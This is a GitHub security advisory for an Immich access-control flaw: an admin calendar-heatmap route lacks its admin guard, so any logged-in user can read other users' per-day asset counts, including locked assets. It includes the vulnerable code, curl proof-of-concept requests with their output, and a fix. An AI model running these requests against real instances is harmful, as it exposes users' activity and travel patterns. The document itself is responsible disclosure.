{"author": null, "closed_at": null, "collaborating_teams": null, "collaborating_users": null, "comments": 3, "created_at": null, "credits": [{"login": "anonymous123-ux-svg", "type": "reporter"}], "credits_detailed": [{"state": "accepted", "type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/170434403?v=4", "events_url": "https://api.github.com/users/anonymous123-ux-svg/events{/privacy}", "followers_url": "https://api.github.com/users/anonymous123-ux-svg/followers", "following_url": "https://api.github.com/users/anonymous123-ux-svg/following{/other_user}", "gists_url": "https://api.github.com/users/anonymous123-ux-svg/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/anonymous123-ux-svg", "id": 170434403, "login": "anonymous123-ux-svg", "node_id": "U_kgDOCiifYw", "organizations_url": "https://api.github.com/users/anonymous123-ux-svg/orgs", "received_events_url": "https://api.github.com/users/anonymous123-ux-svg/received_events", "repos_url": "https://api.github.com/users/anonymous123-ux-svg/repos", "site_admin": false, "starred_url": "https://api.github.com/users/anonymous123-ux-svg/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/anonymous123-ux-svg/subscriptions", "type": "User", "url": "https://api.github.com/users/anonymous123-ux-svg", "user_view_type": "public"}}], "cve_id": "CVE-2026-104867", "cvss": {"score": 4.3, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"}, "cvss_severities": {"cvss_v3": {"score": 4.3, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"}, "cvss_v4": {"score": null, "vector_string": null}}, "cwe_ids": ["CWE-284", "CWE-639", "CWE-1220"], "cwes": [{"cwe_id": "CWE-284", "name": "Improper Access Control"}, {"cwe_id": "CWE-639", "name": "Authorization Bypass Through User-Controlled Key"}, {"cwe_id": "CWE-1220", "name": "Insufficient Granularity of Access Control"}], "description": "### Summary

The admin route `GET /api/admin/users/{id}/calendar-heatmap` is declared with `@Authenticated({ permission: Permission.UserRead })` instead of `@Authenticated({ permission: Permission.AdminUserRead, admin: true })`, and the service method behind it performs no ownership or role check. Every other endpoint on `UserAdminController` carries `admin: true`; this one does not.

As a result **any authenticated non-admin user can retrieve any other user's activity heatmap** — the per-day count of their assets and the total asset count — for an arbitrary date range. The underlying query applies no visibility filter, so **archived and locked (PIN-protected) assets are included in the counts**.

### Details

`server/src/controllers/user-admin.controller.ts` (line 103-117 at `cf213c81e3190dff2350cdb731ebcea1dd5d384e`):

```ts
  @Get(':id/calendar-heatmap')
  @Authenticated({ permission: Permission.UserRead })   // <-- missing `admin: true`, wrong permission
  @Endpoint({ ... })
  getUserCalendarHeatmapAdmin(
    @Auth() auth: AuthDto,
    @Param() { id }: UUIDParamDto,
    @Query() dto: CalendarHeatmapDto,
  ): Promise<CalendarHeatmapResponseDto> {
    return this.service.getCalendarHeatmap(auth, id, dto);
  }
```

For comparison, the sibling handlers on the same controller are correctly guarded, e.g.:

```ts
  @Get(':id/statistics')
  @Authenticated({ permission: Permission.AdminUserRead, admin: true })
  ...
  @Get(':id/sessions')
  @Authenticated({ permission: Permission.AdminSessionRead, admin: true })
```

`Permission.UserRead` is an ordinary, non-privileged permission. `AuthService.authenticate()` only rejects non-admins when the route metadata sets `adminRoute`, so with `admin: true` absent, the guard lets any ordinary session through.

`server/src/services/user-admin.service.ts`:

```ts
  async getCalendarHeatmap(auth: AuthDto, id: string, dto: CalendarHeatmapDto): Promise<CalendarHeatmapResponseDto> {
    await this.findOrFail(id, { withDeleted: false });
    return getCalendarHeatmap(id, dto, { asset: this.assetRepository });
  }
```

`auth` is accepted but never compared against `id`, and `requireAccess`/`checkAccess` is never called — so the missing guard is not compensated for at the service layer.

`AssetRepository.getCalendarHeatmap()` (`server/src/repositories/asset.repository.ts`) filters only on `ownerId`, the date column and `deletedAt is null`:

```ts
      .where('ownerId', '=', asUuid(ownerId))
      .where(column, '>=', dto.from)
      .where(column, '<', dto.to)
      .where('deletedAt', 'is', null)
```

There is no `visibility` predicate, so assets the victim has set to `archive` or `locked` are counted as well.

Exploitation is trivially chainable across the whole instance: `GET /api/users` is available to every authenticated user and returns the `id`, `email` and `name` of every account, giving an attacker the complete list of target UUIDs.

### PoC

Tested against a stock `docker/docker-compose.yml` deployment (`ghcr.io/immich-app/immich-server:v3`, reported version `3.0.3`).

Setup: three accounts — `admin`, `victim`, `attacker`. `attacker` is a plain non-admin user with **no** partner relationship and **no** shared album with `victim`. `victim` uploads three assets (taken 2026-07-20, -21, -22), then archives one and locks another.

```bash
API=http://localhost:2283/api
XT=<attacker session token>            # ordinary, non-admin user
VID=dc1774f8-edf4-4d06-9ed7-e4cfc0dbb3ff   # victim's user id, from GET /api/users

# 1. Upload-date heatmap of another user
curl -s -H "Authorization: Bearer $XT" \
  "$API/admin/users/$VID/calendar-heatmap" | jq -c '{from,to,totalCount,nonzero:[.series[]|select(.count>0)]}'
# => {"from":"2025-07-30","to":"2026-07-28","totalCount":3,"nonzero":[{"date":"2026-07-28","count":3}]}

# 2. Capture-date ("Taken") heatmap — leaks when the victim actually took the photos
curl -s -H "Authorization: Bearer $XT" \
  "$API/admin/users/$VID/calendar-heatmap?type=Taken&from=2026-07-01&to=2026-07-28" | jq -c '{totalCount,nonzero:[.series[]|select(.count>0)]}'
# => {"totalCount":3,"nonzero":[{"date":"2026-07-20","count":1},{"date":"2026-07-21","count":1},{"date":"2026-07-22","count":1}]}
```

`totalCount` stays at `3` after the victim moves one asset to `archive` and one to `locked`, confirming that hidden and PIN-protected assets are included.

Controls, same attacker token, same victim id — the correctly guarded siblings behave as expected:

```
GET /api/admin/users/$VID/statistics   ->  403 {"message":"Forbidden"}
GET /api/admin/users/$VID              ->  403 {"message":"Forbidden"}
GET /api/admin/users/$VID/calendar-heatmap (unauthenticated) -> 401
```

### Impact

Broken access control / horizontal-and-vertical privilege escalation on an admin route (CWE-284, CWE-639, CWE-1220).

Any user who can obtain a session on the instance — including a self-registered user on a server with OAuth auto-registration enabled — can, for every account on the server:

* read the total number of assets the account owns;
* read a per-day histogram of upload activity (`type=Upload`) over an arbitrary range;
* read a per-day histogram of **capture dates** (`type=Taken`), which discloses when the target was taking photos and, by extension, activity/absence and travel patterns;
* have archived and **locked (PIN-protected)** assets counted in all of the above, which defeats the confidentiality expectation those two features are meant to provide.

No metadata other than counts and dates is returned, so this is a confidentiality-only issue with no integrity or availability impact.

Suggested CVSS v3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` (4.3, Medium).

### Affected versions

The endpoint is annotated `new HistoryBuilder().added('v3').stable('v3')`, i.e. it ships from the v3.0.0 release onward. Confirmed exploitable on v3.0.3; the vulnerable annotation is still present on `main` at commit `cf213c81e3190dff2350cdb731ebcea1dd5d384e` (v3.1.0-dev). Pre-v3 releases do not have this endpoint.

### Suggested fix

Align the decorator with the rest of `UserAdminController`:

```diff
--- a/server/src/controllers/user-admin.controller.ts
+++ b/server/src/controllers/user-admin.controller.ts
@@
   @Get(':id/calendar-heatmap')
-  @Authenticated({ permission: Permission.UserRead })
+  @Authenticated({ permission: Permission.AdminUserRead, admin: true })
   @Endpoint({
```

Two hardening suggestions worth considering alongside the one-line fix:

1. Add an explicit guard inside `UserAdminService.getCalendarHeatmap` (and, for defence in depth, `getSessions`/`getStatistics`) rather than relying solely on the controller decorator — these three currently accept `auth` without using it, so a decorator mistake is not caught anywhere.
2. Add a test/lint rule asserting that every handler on a controller mounted under the `admin` route prefix carries `admin: true`; that would have caught this class of typo mechanically.

---

Reported in good faith after testing exclusively against a local, self-hosted instance of Immich that I control. No third-party or immich-app-operated systems were touched. Happy to provide any further detail you need.
